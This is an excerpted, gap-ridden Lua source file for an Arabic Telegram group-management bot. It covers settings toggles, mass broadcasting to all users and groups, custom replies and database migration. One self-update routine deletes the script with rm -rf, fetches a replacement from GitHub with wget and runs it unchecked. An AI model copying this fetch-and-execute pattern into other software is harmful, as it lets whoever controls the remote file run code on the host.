DevRio:del(SAKO..'Rio:PinnedMsg'..msg.chat_id_)
...
local PinId = DevRio:get(SAKO..'Rio:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevRio:del(SAKO..'Rio:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevRio:scard(SAKO.."Rio:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevRio:scard(SAKO.."Rio:Constructor:"..ChatId) or 0
local BanedList = DevRio:scard(SAKO.."Rio:Ban:"..ChatId) or 0
local ManagerList = DevRio:scard(SAKO.."Rio:Managers:"..ChatId) or 0
local MutedList = DevRio:scard(SAKO.."Rio:Muted:"..ChatId) or 0
local TkeedList = DevRio:scard(SAKO.."Rio:Rio:Tkeed:"..ChatId) or 0
local AdminsList = DevRio:scard(SAKO.."Rio:Admins:"..ChatId) or 0
local VipList = DevRio:scard(SAKO.."Rio:VipMem:"..ChatId) or 0
...
ChatLeave(dp.id_, SAKO)
DevRio:srem(SAKO.."Rio:Groups", dp.id_)
else
...
DevRio:set(SAKO..'Rio:Num:Add:Bot',Num) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:FreeBot'..SAKO) 
end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:FreeBot'..SAKO,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل صورتي بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Lock:Games'..msg.chat_id_,true)  
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Lock:Gamesinline'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل اضف رد'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO.."Rio:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO.."Rio:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source SAKO     --
...
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(SAKO.."Rio:Groups",msg.chat_id_)
if not DevRio:get(SAKO..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevRio:incrby(SAKO..'Rio:Sudos'..msg.sender_user_id_,1)
DevRio:set(SAKO..'Rio:SudosGp'..msg.sender_user_id_..msg.chat_id_,"rio")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevRio:sismember(SAKO..'Rio:Groups',msg.chat_id_) then
...
local Text = "᥀︙Source SAKO\n᥀︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevRio:scard(SAKO.."Rio:Managers:"..v) or 0
local GroupsAdmins = DevRio:scard(SAKO.."Rio:Admins:"..v) or 0
local Groupslink = DevRio:get(SAKO.."Rio:Groups:Links" ..v)
...
DevRio:setex(SAKO.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(SAKO.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(SAKO.."Rio:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(SAKO..'Rio:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
...
DevRio:setex(SAKO.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(SAKO.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(SAKO.."Rio:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevRio:smembers(SAKO..'Rio:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevRio:setex(SAKO.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(SAKO.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(SAKO.."Rio:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(SAKO..'Rio:Groups')   
for k,v in pairs(List) do  
...
DevRio:setex(SAKO.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(SAKO.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(SAKO.."Rio:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevRio:smembers(SAKO..'Rio:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevRio:setex(SAKO.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevRio:get(SAKO.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevRio:del(SAKO.."Rio:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevRio:smembers(SAKO.."Rio:Groups") 
if msg.content_.text_ then
...
RioText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
RioText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
RioText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
RioText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
RioText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
RioText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
RioText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
RioText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevRio:set(SAKO..'Rio:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevRio:get(SAKO..'Rio:Lock:Rd'..msg.chat_id_) then 
...
local List = DevRio:smembers(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevRio:set(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevRio:sismember(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
...
DevRio:set(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevRio:set(SAKO..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevRio:set(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevRio:set(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevRio:set(SAKO..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source SAKO     --
...
local List = DevRio:smembers(SAKO..'Rio:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevRio:get(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevRio:set(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevRio:set(SAKO..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevRio:sadd(SAKO..'Rio:Manager:GpRed'..msg.chat_id_,text)
DevRio:set(SAKO..'DelManagerRep'..msg.chat_id_,text)
return false
end end
--     Source SAKO     --
...
local List = DevRio:smembers(SAKO.."Rio:Sudo:AllRed")
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevRio:set(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevRio:set(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevRio:get(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
...
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
DevRio:set(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevRio:set(SAKO.."Rio:Add:AllText"..msg.sender_user_id_, text)
DevRio:sadd(SAKO.."Rio:Sudo:AllRed",text)
DevRio:set(SAKO.."DelSudoRep",text)
return false 
end end
--     Source SAKO     --
...
local redod = DevRio:smembers(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_)
MsgRep = '᥀︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevRio:smembers(SAKO..'Rio:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevRio:get(SAKO..'Rio:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevRio:del(SAKO..'Rio:Text:GpTexts'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevRio:smembers(SAKO..'Rio:Manager:GpRed'..msg.chat_id_)
MsgRep = '᥀︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(SAKO.."Rio:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevRio:get(SAKO.."Rio:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevRio:get(SAKO.."Rio:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevRio:get(SAKO.."Rio:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevRio:get(SAKO.."Rio:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevRio:get(SAKO.."Rio:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevRio:get(SAKO.."Rio:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevRio:get(SAKO.."Rio:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevRio:del(SAKO..'Rio:Gif:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Voice:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Audio:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Photo:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Stecker:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Video:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:File:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Text:GpRed'..v..msg.chat_id_)
DevRio:del(SAKO..'Rio:Manager:GpRed'..msg.chat_id_)
end
...
local redod = DevRio:smembers(SAKO.."Rio:Sudo:AllRed")
MsgRep = '᥀︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevRio:get(SAKO.."Rio:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevRio:get(SAKO.."Rio:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevRio:get(SAKO.."Rio:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevRio:get(SAKO.."Rio:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevRio:get(SAKO.."Rio:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevRio:get(SAKO.."Rio:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevRio:get(SAKO.."Rio:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevRio:get(SAKO.."Rio:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
for k,v in pairs(redod) do
DevRio:del(SAKO.."Rio:Add:AllRed"..v)
DevRio:del(SAKO.."Rio:Gif:AllRed"..v)
DevRio:del(SAKO.."Rio:Voice:AllRed"..v)
DevRio:del(SAKO.."Rio:Audio:AllRed"..v)
DevRio:del(SAKO.."Rio:Photo:AllRed"..v)
DevRio:del(SAKO.."Rio:Stecker:AllRed"..v)
DevRio:del(SAKO.."Rio:Video:AllRed"..v)
DevRio:del(SAKO.."Rio:File:AllRed"..v)
DevRio:del(SAKO.."Rio:Text:AllRed"..v)
DevRio:del(SAKO.."Rio:Sudo:AllRed")
end
...
DevRio:set(SAKO..'Rio:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevRio:set(SAKO..'Rio:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help0'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help0'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help01'..msg.sender_user_id_)
if SAKOTeam == 'msg' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help01'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help1', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help21'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help21'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help2', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help31'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help31'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help3', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help41'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help41'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help4', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help51'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help51'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help5', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevRio:set(SAKO..'Rio:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SAKOTeam =  DevRio:get(SAKO..'Rio:Help61'..msg.sender_user_id_)
if SAKOTeam == 'msg' then
Dev_Rio(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevRio:del(SAKO..'Rio:Help61'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:Help6', text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
...
os.execute('rm -rf SAKO.lua') 
os.execute('wget https://raw.githubusercontent.com/LARICATEAM/SAKO/master/SAKO.lua') 
dofile('SAKO.lua') 
...
local Users = DevRio:smembers(SAKO.."User_Bot")
local Groups = DevRio:smembers(SAKO..'Chek:Groups')
local Sudos = DevRio:smembers(SAKO.."Sudo:User")
if DevRio:get(SAKO..'Name:Bot') then
DevRio:set(SAKO..'Rio:NameBot',(DevRio:get(SAKO..'Name:Bot') or 'ديفد'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevRio:sadd(SAKO..'Rio:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevRio:sadd(SAKO..'Rio:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevRio:sadd(SAKO..'Rio:Groups',Groups[i]) 
if DevRio:get(SAKO.."Private:Group:Link"..Groups[i]) then
DevRio:set(SAKO.."Rio:Groups:Links"..Groups[i],DevRio:get(SAKO.."Private:Group:Link"..Groups[i]))
end
if DevRio:get(SAKO.."Get:Welcome:Group"..Groups[i]) then
DevRio:set(SAKO..'Rio:Groups:Welcomes'..Groups[i],DevRio:get(SAKO.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevRio:smembers(SAKO..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevRio:sadd(SAKO.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(SAKO..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(SAKO.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(SAKO..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(SAKO.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(SAKO..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(SAKO.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(SAKO..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(SAKO.."Rio:VipMem:"..Groups[i], v)
end
